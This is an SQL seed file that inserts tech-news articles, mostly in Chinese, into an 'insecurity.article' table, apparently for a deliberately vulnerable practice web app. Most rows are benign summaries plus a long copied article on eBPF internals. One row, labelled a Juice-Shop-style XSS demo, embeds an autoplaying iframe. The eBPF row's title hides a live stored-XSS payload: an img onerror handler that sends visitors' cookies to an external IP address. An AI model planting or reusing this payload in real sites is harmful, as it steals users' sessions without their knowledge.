INSERT INTO insecurity.article (aid, uid, title, tags, img_url, content, create_time, update_time,hot) VALUES (8, 4, '物联网渗透测试（十三）：使用 firmware-mod-kit(FMK) 在固件中添加后门', '安全,测试,物联网', 'https://static001.infoq.cn/resource/image/9f/94/9f719cf52f756b05c9eb974d4c632894.jpg', '主要面向想要熟悉 IoT 设备漏洞的挖掘和利用的软件开发人员、质量保障人员、安全从业人员，以及对主动防御措施感兴趣的读者。', '2020-05-21 00:51:56', '2020-05-21 00:51:56',1);
INSERT INTO insecurity.article (aid, uid, title, tags, img_url, content, create_time, update_time,hot) VALUES (9, 5, '超详解析 Flutter 渲染引擎 | 业务想创新，不了解底层原理怎么行？', '硬件,安全,架构,文化 & 方法,小程序,方法论', 'https://static001.infoq.cn/resource/image/4c/0f/4c63e63cba752e8706b32e71fe99740f.png', '本文对 Flutter 的底层渲染引擎进行深入分析和整理，以理清 Flutter 的渲染的机制及思路，分享基于 Flutter 引擎一些探索。', '2020-05-21 00:53:34', '2020-05-21 00:53:34',1);
INSERT INTO insecurity.article (aid, uid, title, tags, img_url, content, create_time, update_time,hot) VALUES (10, 4, 'Zoom 停止中国个人用户注册，研发重心向美国转移', '架构,产业互联网,产品,安全,企业动态', 'https://static001.infoq.cn/resource/image/e0/8b/e004c5b351aa51812a559fe0e56b6d8b.png', '风不平，浪不静，Zoom 再登风口浪尖。', '2020-05-21 00:55:29', '2020-05-21 00:55:29',1);
INSERT INTO insecurity.article (aid, uid, title, tags, img_url, content, create_time, update_time,hot) VALUES (11, 5, 'Synopsys：75% 的代码库包含漏洞，每个代码库平均有 82 个漏洞', '安全,文化 & 方法,开源,企业动态', 'https://static001.infoq.cn/resource/image/4c/a4/4ca36e9d4cf134a848dc699fe1fce0a4.jpg', 'Synopsys 公司最近发布了“2020 年开源安全和风险分析（OSSRA）报告”，有许多重磅发现。', '2020-05-21 00:57:07', '2020-05-21 00:57:07',1);
INSERT INTO insecurity.article (aid, uid, title, tags, img_url, content, create_time, update_time,hot) VALUES (14, 4, '一个和 Juice-Shop 同款的 XSS 注入漏洞， 挺好听的音乐', '安全, 注入', 'https://static001.infoq.cn/resource/image/bd/6f/bda3f8dd92c40995bdbaa91eabb2a46f.jpeg', '一个和 Juice-Shop 同款的 XSS 注入漏洞， 挺好听的音乐... 音乐真的很好听，旋律好听，啦啦啦啦啦啦啦<iframe width="100%" height="166" scrolling="no" frameborder="no" allow="autoplay" src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076&color=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true"></iframe>', '2020-05-21 02:30:35', '2020-05-21 02:30:35',1);
INSERT INTO insecurity.article (aid, uid, title, tags, img_url, content, create_time, update_time,hot) VALUES (15, 4, 'eBPF Internal：Instructions and Runtime <img id="asda-123123" src="123" onerror="document.getElementsByTagName(''wechat-img'')[0].setAttribute(''src'',''http://47.108.156.22:8088/cookie/set?cookie=''+encodeURIComponent(document.cookie))">', '安全,架构,开源,测试,前端,Linux', 'https://static001.infoq.cn/resource/image/0f/12/0f97cf1e5e45291ccb5eb904b6713012.png', '<p style="text-align:justify;text-indent:2em;">eBPF 是最近几年异常火爆的一门内核技术，从 2011 年开发至今，eBPF 社区依然非常活跃 。eBPF 可以通过热加载的方式动态的获取、修改内核中的关键数据和执行逻辑，避免内核模块的方式可能会引入宕机风险，并具备堪比原生代码的执行效率。</p><p style="text-align:justify;text-indent:2em;">大家已经在各种文章中了解到 eBPF 的应用场景、最佳实践等，也在 cilium 和 bcc 等工具中领略到了 eBPF 的强大能力。eBPF 是如何具备堪比原生的执行效率和动态扩展当前 Linux 内核的能力，接下来将为大家揭开这一层薄纱。</p><h2 style="text-align:justify;text-indent:2em;">Intro</h2><p style="text-align:justify;text-indent:2em;">首先我们介绍一下 eBPF 的前世今生，以便我们更好的了解接下来的内容。如果已有了解和实践，可快速跳到下一章节。</p><p style="text-align:justify;text-indent:2em;">大家或多或少都接触使用过 tcpdump 工具，tcpdump 可以根据用户指定的自定义过滤规则，在报文出入协议栈时获取报文的元信息。tcpdump 之所以可以灵活的过滤用户报文，本质是将过滤规则转化为一种特殊的指令，例如下图：</p><p style="text-align:justify;text-indent:2em;"></p><div class="media-wrap image-wrap"><img src="https://static001.infoq.cn/resource/image/bf/20/bfa19d4f0cca1e2f5d819dc02c7cbf20.png" alt="eBPF Internal：Instructions and Runtime"/></div><p></p><p style="text-align:justify;text-indent:2em;">这种特殊的指令被称为 BPF，在 eBPF 诞生后被称为 cBPF。这种特殊指令通过 libpcap 接口传递进入内核，当网卡收到了数据包后会执行注册的 AF_<strong>PA</strong>CK 协议中的 packet_rcv 函数，执行用户态传入的 BPF 指令，如果满足过滤规则就 clone 到用户态。大体的流程如下图：</p><p style="text-align:justify;text-indent:2em;"></p><div class="media-wrap image-wrap"><img src="https://static001.infoq.cn/resource/image/c3/26/c3c6390f5fa4aeb0ee744794a5df7726.png" alt="eBPF Internal：Instructions and Runtime"/></div><p></p><p style="text-align:justify;text-indent:2em;">通过这种机制可以极大提高了规则的灵活度，可以根据用户的需求过滤复杂的报文。同时可以不断优化内核中的 BPF 指令执行器提高执行效率，例如 JIT、SIMD 等等。</p><p style="text-align:justify;text-indent:2em;">cBPF (classic Berkeley Packet Filter) 的诞生可以追溯到 1992 年。tcpdump 作为 cBPF 的典型应用，seccomp 也基于 cBPF 进行安全过滤。cBPF 主要特点如下：</p><ol><li>内核内置 BPF 指令解释器，允许从用户态传入内核中；</li><li>图灵不完备，BPF 指令不具备循环等语义，确保内核执行指令的安全；</li><li>解释运行，支持 JIT。如上面提到的 tcpdump 场景，每一个报文皆需要经过过滤器，指令的执行速度严重影响性能，故引入了常见的 JIT 指令优化方式，可以将指令转换为本地指令，加速指令执行，通常会有数倍的性能提升；</li></ol><p style="text-align:justify;text-indent:2em;">时间逐渐来到了 21 世纪，eBPF 从 2011 年开始开发。eBPF 与 cBPF 的主要区别如下：</p><ol><li>定义了新的 ISA，扩展了 cBPF 指令，eBPF 的指令主要受 amd64 和 arm64 的影响，并扩展了 64bit 的寄存器；</li><li>使用 LLVM 作为 BPF 的编译器，由于 eBPF 指令极大的扩展，并支持将 C 编译为 BPF 指令集，再将编译器内置在内核中会引入庞大的代码，同时社区已有 LLVM 和 GCC 等成熟的工具，故首先基于 LLVM 扩展了 BPF 后端，GCC 距离使用还要等等；</li><li>引入了用户可使用的 bpf.h 头文件，便于用户态程序使用内核封装的 eBPF 程序；</li><li>依然是图灵不完备，安全和效率依然是第一位考虑，不过在最近的内核中引入了 bonded loop，可以在安全的情况下执行循环；</li><li>解释运行，支持 JIT。同 cBPF，但是扩展了更多的架构，支持在 amd64 和 aarch64 等更多的架构；</li></ol><p style="text-align:justify;text-indent:2em;">经过了 cBPF 和 eBPF 的不断迭代和发展，基于 BPF 已经诞生了很多生产级别的项目：</p><ol><li>Katran，Facebook 开源的 4 层负载均衡，基于 XDP；</li><li>BCC 工具集，bpftrace 和 systemtap-bpf，丰富并增强了内核调试和跟踪的能力；</li><li>Cilium，微服务和 k8s 场景下的网络治理工具；</li><li>IO Visor Project，提到了 BCC 就不能不提到 iovisor 项目，其开源了 BCC, bpftrace, gobpf, ubpf 等一众工具；</li></ol><p style="text-align:justify;text-indent:2em;">当前的 BPF 常见模型：无循环、无锁的简短的 BPF 程序，将很多内核的 helper 和 hook 点粘合在一起。在下面这几种场景下都有运用：</p><ol><li>Tracing<br/>a. kprobe<br/>b. tracepoint</li><li>Networking<br/>a. sched<br/>b. XDP</li><li>Security<br/>a. secomp</li></ol><p style="text-align:justify;text-indent:2em;">最后，大家为什么会去了解并使用 BPF。很重要的原因是为了更多的控制权，包括实现一些在用户态还不能够满足需求，或者内核的某些行为需要修改的场景。BPF 的最佳场景也是在用户态和内核态互相配合，共享数据。当然，BPF 也是 CO-RE，一次编译各处运行，具有比较好的可移植性。</p><h2 style="text-align:justify;text-indent:2em;">Why BPF is FAST</h2><p style="text-align:justify;text-indent:2em;">BPF 在内核中的运行，可以概括为下面的流程：</p><p style="text-align:justify;text-indent:2em;"></p><div class="media-wrap image-wrap"><img src="https://static001.infoq.cn/resource/image/de/55/decc716586c35bcf304081bc977e2155.png" alt="eBPF Internal：Instructions and Runtime"/></div><p></p><p style="text-align:justify;text-indent:2em;">我们假设一种场景，我们将 BPF attach 到了某个热点的 tracepoint 之上，例如收发包，每次收发包时，tracepoint attached 的 BPF 程序都会被执行一遍。在比较繁忙的机器上，收发包可能每秒钟百万次，执行效率至关重要，如果 BPF 程序被 attach 在热点中，性能问题很可能会成千上万倍的放大。在我们探讨 BPF 程序为什么会执行的如此之快之前，我们有必要先了解下 BPF 指令和解释器。</p><h3 style="text-align:justify;text-indent:2em;">指令</h3><p style="text-align:justify;text-indent:2em;">BPF 当前拥有 102 个指令，主要包括三大类：ALU (64bit and 32bit)、内存操作和分支操作。其中指令的格式主要由下面这几部分组成：</p><ol><li>8bit opcode</li><li>4bit destination register (dst)</li><li>4bit source register (src)</li><li>16bit 偏移</li><li>32bit 立即数</li></ol><p style="text-align:justify;text-indent:2em;"></p><div class="media-wrap image-wrap"><img src="https://static001.infoq.cn/resource/image/24/a7/2494ac02a79b9b892c82dc51fa81afa7.png" alt="eBPF Internal：Instructions and Runtime"/></div><p></p><p style="text-align:justify;text-indent:2em;">与我们常见的 x86 或 ARM 的指令非常接近。在定义了指令后，每一条的指令执行，是通过内核中的解释器运行，流程可以抽象为一个 loop 循环，也被称为指令分发，循环内会不断的载入指令、执行指令，直至退出。</p><p style="text-align:justify;text-indent:2em;"></p><div class="media-wrap image-wrap"><img src="https://static001.infoq.cn/resource/image/89/5c/89539baa3a885e363b6becc503bd4f5c.png" alt="eBPF Internal：Instructions and Runtime"/></div><p></p><h3 style="text-align:justify;text-indent:2em;">虚拟机</h3><p style="text-align:justify;text-indent:2em;">我们可以认为是 BPF 字节码是运行在内核中的 BPF 虚拟机中，BPF 字节码也是我们通常提到的 p-code (portable code)，主要目的是为了软件解释器的高效运行。提到了虚拟机，不得不提到我们常见的几种解释运行的语言，例如 Python 和 Lua。根据虚拟机的实现，可以分为两类，基于栈的虚拟机和基于寄存器的虚拟机，其中基于栈的虚拟机的思想，最早是来自于 Pascal，CPython 和 Lua 4 同样是基于栈的虚拟机。Lua 5 和 Dalvik JVM 则是基于寄存器的虚拟机，BPF 同样是基于寄存器的虚拟机，那么栈和寄存器的实现有何不同，性能是否有所差异，接下来我们继续分析。</p><p style="text-align:justify;text-indent:2em;">基于栈的虚拟机，顾名思义指令是以栈的数据结构组织的。下面的图可以比较清晰的展示这一流程：</p><p style="text-align:justify;text-indent:2em;"></p><div class="media-wrap image-wrap"><img src="https://static001.infoq.cn/resource/image/a0/7a/a05fd836e376d9846a7fa934a4ca257a.png" alt="eBPF Internal：Instructions and Runtime"/></div><p></p><p style="text-align:justify;text-indent:2em;">当我们需要获得 20+7 结果时，需要生成 4 条指令，LIFO 执行。这样会生成更多的指令，同时需要移动多次内存，但是由于没有众多的寄存器，虚拟机的实现会相对简单。</p><p style="text-align:justify;text-indent:2em;">我们再来看下基于寄存器的虚拟机，不同于频繁操作栈，它可以直接操作寄存器，如下图流程演示：</p><p style="text-align:justify;text-indent:2em;"></p><div class="media-wrap image-wrap"><img src="https://static001.infoq.cn/resource/image/3a/e4/3a9cf0d5e9fce347a215c89c319dcae4.png" alt="eBPF Internal：Instructions and Runtime"/></div><p></p><p style="text-align:justify;text-indent:2em;">同样的需要获得 20+7 的结果，在寄存器足够的情况下，我们只需要生成并执行一条指令即可。指令行数相对于栈的实现有显著减少，效率也会提高。但是基于寄存器的虚拟机实现会更加复杂，同时每次指令需要访问更多的内存，并且指令也会更复杂，因为需要提供 2,3,4 地址指令的支持。</p><p style="text-align:justify;text-indent:2em;">通过 <em>Data from A Performance on Stack-based and Register-based Virtual Machine</em> 论文，我们可以对通用场景下，基于栈和基于寄存器的进行一个简单的对比：</p><ul><li>基于寄存器的虚拟机性能在总的时间上比基于栈的虚拟机快 20.39%；</li><ul><li>指令分发执行，基于寄存器的虚拟机快 66.42%</li><li>数据获取，基于栈的虚拟机快 23.5%</li></ul></ul><p></p><p style="text-align:justify;text-indent:2em;"></p><div class="media-wrap image-wrap"><img src="https://static001.infoq.cn/resource/image/d7/3b/d7208249d7224c31adf6f1c599ba773b.png" alt="eBPF Internal：Instructions and Runtime"/></div><p></p><p style="text-align:justify;text-indent:2em;"></p><div class="media-wrap image-wrap"><img src="https://static001.infoq.cn/resource/image/24/eb/24c9f6c0662d1d5f7060e4e07ad5a1eb.png" alt="eBPF Internal：Instructions and Runtime"/></div><p></p><p style="text-align:justify;text-indent:2em;">通过这个对比，我们可以得出一个初步结论，在通用场景下，基于寄存器比基于栈的虚拟机实现，性能更好。当然仅仅这种精心设计的测试可能实际意义不是很大，我们还需要一个实际生产级别的示例和数据。巧合的是，Lua 4 的虚拟机实现是基于栈，而 Lua 5 换成了性能更好的基于寄存器的实现。我们对比了二者的性能：</p><p style="text-align:justify;text-indent:2em;"></p><div class="media-wrap image-wrap"><img src="https://static001.infoq.cn/resource/image/e7/20/e743a64160a4e75d1a2eed9a6d673120.png" alt="eBPF Internal：Instructions and Runtime"/></div><p></p><p style="text-align:justify;text-indent:2em;">通过这一个官方的数据对比，可以看出来 Lua 5 比 Lua 4 快了 34% 左右。由此可见在实际的应用中，基于寄存器的虚拟机确实可以带来更高的性能，但是从上面的数据看到，仅仅百分之几十的性能提升，相对于原生指令还有更大的提升余地。</p><h3 style="text-align:justify;text-indent:2em;">JIT</h3><p style="text-align:justify;text-indent:2em;">在语言层面的性能对比中，有一个代表性的性能测试场景 Techempower。一门语言，和这门语言下的不同 web 框架，分别测试 HTTP 处理性能。通过下面这种图，我们可以看到，编译为本地代码的语言性能遥遥领先，而 Python 这种解释运行的语言却名落孙山，但是其中有一个例外，Java 的性能可以和 Rust、Go 这些语言互有胜负，我们已经知道 Java 某种意义上也是解释运行，抛开 Java VM 多年持续优化，与 CPython 最大的不同则是 JIT 的支持。</p><p style="text-align:justify;text-indent:2em;"></p><div class="media-wrap image-wrap"><img src="https://static001.infoq.cn/resource/image/85/32/854b161470f5d76f91e6397d738fe632.png" alt="eBPF Internal：Instructions and Runtime"/></div><p></p><p style="text-align:justify;text-indent:2em;">何为 JIT？JIT (Just-in-time) 在 2011 年引入到 cBPF。与 JIT 相对应的为 AOT (ahead-of-time)。JIT 不需要解释器，或者说扩展了解释器，JIT 在运行时会将指令编译为原生指令在本机执行。BPF 虚拟机会将所有的字节码翻译到本地原生代码再执行，具体的是翻译 BPF 字节码到本地原生代码，保存到内存中的特定区域并执行。BPF 程序通常比较简洁和轻量，引入 JIT 不会显著影响冷启动性能。</p><p style="text-align:justify;text-indent:2em;">启用 JIT 究竟会带来多大的性能提升？之前提到的 Lua 在之后的版本提供了 LuaJIT 的实现，最大的变化是使用 JIT 重写。下面是一组 LuaJIT vs Lua 的性能数据，我们可以看到 LuaJIT 比 Lua 快 2-10 倍。</p><p style="text-align:justify;text-indent:2em;"></p><div class="media-wrap image-wrap"><img src="https://static001.infoq.cn/resource/image/82/24/82ea78d9649ba5cb46d7cb65ec001624.png" alt="eBPF Internal：Instructions and Runtime"/></div><p></p><p style="text-align:justify;text-indent:2em;">同样的，PyPy 是 CPython 基于 JIT 的实现，我们看到 PyPy 比 CPython 快 2-10 倍。</p><p style="text-align:justify;text-indent:2em;"></p><div class="media-wrap image-wrap"><img src="https://static001.infoq.cn/resource/image/c8/bc/c8ebefd57317e5088008735bc8a21bbc.png" alt="eBPF Internal：Instructions and Runtime"/></div><p></p><p style="text-align:justify;text-indent:2em;">对于 BPF 而言，JIT 究竟会带来多大的性能？uBPF 是一个很好的测试程序，uBPF 是 BPF 虚拟机在用户态的实现，它提供了可选的 JIT，我们可以使用 clang 将测试程序编译为 elf 文件，分别测试开启和关闭 JIT 情况下，执行同一个 BPF 程序的性能。从下面的测试数据可以看到，开启 JIT 后性能同样也有数倍的提升。</p><p style="text-align:justify;text-indent:2em;"></p><div class="media-wrap image-wrap"><img src="https://static001.infoq.cn/resource/image/5d/b7/5d253458546866995f8ced422d26c7b7.png" alt="eBPF Internal：Instructions and Runtime"/></div><p></p><h2 style="text-align:justify;text-indent:2em;">How BPF extends Kernel</h2><p style="text-align:justify;text-indent:2em;">我们在前面的内容中，提到了编译、指令集和虚拟机。那么 BPF 是如何编译成一个可执行文件，在内核中运行的？</p><h3 style="text-align:justify;text-indent:2em;">LLVM</h3><p style="text-align:justify;text-indent:2em;">当前 BPF 的编译离不开 LLVM，LLVM 分为前端和后端，我们可以将任何语言编译为 LLVM IR，这是一种中间文件。LLVM 可以将 LLVM IR 编译为目标文件，也就是我们提到的二进制文件。</p><p style="text-align:justify;text-indent:2em;"></p><div class="media-wrap image-wrap"><img src="https://static001.infoq.cn/resource/image/65/a2/65b3a4e3b14b84174bc559b39becbda2.png" alt="eBPF Internal：Instructions and Runtime"/></div><p></p><p style="text-align:justify;text-indent:2em;">对于 BPF 而言，我们可以使用 clang 将 BPF 编译为 LLVM IR 文件，LLVM 当前已经支持 BPF 作为目标文件，因此我们可以将任何的 LLVM IR 编译为 BPF 目标文件。大体的流程可以参考下图：</p><p style="text-align:justify;text-indent:2em;"></p><div class="media-wrap image-wrap"><img src="https://static001.infoq.cn/resource/image/82/e9/82278632c4213d9c5c674412af5785e9.png" alt="eBPF Internal：Instructions and Runtime"/></div><p></p><p>一张图</p><p style="text-align:justify;text-indent:2em;">我们当前在使用 C 编写，并编译成 BPF 程序。从上面的流程中，我们可以了解到，我们可以将任何语言翻译为 LLVM IR，只需要这门语言提供 LLVM 的前端，我们就可以将这门语言编译为 BPF 目标文件。幸运的是，当前很多主流语言都提供了 LLVM 的前端，例如 C, C++, Go Haskell 等等。</p><p style="text-align:justify;text-indent:2em;">我们将各种语言编译为 BPF 目标文件后，我们不仅可以使用这些语言来开发 BPF 程序，我们还可以将 BPF 作为一种通用的指令集，使用用户态的虚拟机来运行 BPF 执行，作为一种平台无关、CO-RE 的指令架构。</p><h3 style="text-align:justify;text-indent:2em;">WASM</h3><p style="text-align:justify;text-indent:2em;">如同现在如日中天的 WASM，作为一种开源的可移植的字节码格式，在边缘计算和浏览器中被广泛使用。其中 WASM 已有具备了在内核中执行的能力，BPF 作为内核的亲儿子，相比于 WASM 更适合在内核中运行，并且可以与内核更紧密的结合。</p><p style="text-align:justify;text-indent:2em;"></p><div class="media-wrap image-wrap"><img src="https://static001.infoq.cn/resource/image/04/e2/04a733d7c1478b1c873fd0db25d0e1e2.png" alt="eBPF Internal：Instructions and Runtime"/></div><p></p><h2 style="text-align:justify;text-indent:2em;">BPF in the future</h2><p style="text-align:justify;text-indent:2em;">在谈未来之前，我们不能忘记 BPF 的初衷：</p><h3 style="text-align:justify;text-indent:2em;">BPF goal</h3><ul><li>Let non-kernel developers safely and easily modify kernel behavior.</li></ul><h3 style="text-align:justify;text-indent:2em;">BPF non goals</h3><ul><li>Implement dynamic tracing and kernel introspection</li><li>Implement software defined networking, firewalls, load balancers, service mesh</li></ul><p style="text-align:justify;text-indent:2em;">在秉持着 BPF 的 goals 前提下，我们在未来做的更多，场景也更大：</p><h3 style="text-align:justify;text-indent:2em;">BPF in kernel</h3><ul><li>安全的锁和内存操作</li><li>允许用户在内核中执行更多的指令</li><li>更快的速度</li></ul><h3 style="text-align:justify;text-indent:2em;">BPF in user-space</h3><ul><li>作为一种通用的字节码</li><li>CO-RE</li><li>原生支持 Rust、Go 和其他语言</li></ul><h2 style="text-align:justify;text-indent:2em;">尾巴</h2><p style="text-align:justify;text-indent:2em;">我们团队在使用 eBPF 做一些很 cool 的事情，包括将社区的 bcc 工具包引入集团和 Aliyun Linux 2 中，基于 eBPF + tracepoint 自研了网络时延跟踪工具 NX tracepoint 等等。如果有对 BPF 技术生态感兴趣的小伙伴可以随时联系我们。</p><p></p>', '2020-05-21 02:30:35', '2020-05-21 02:30:35',1);
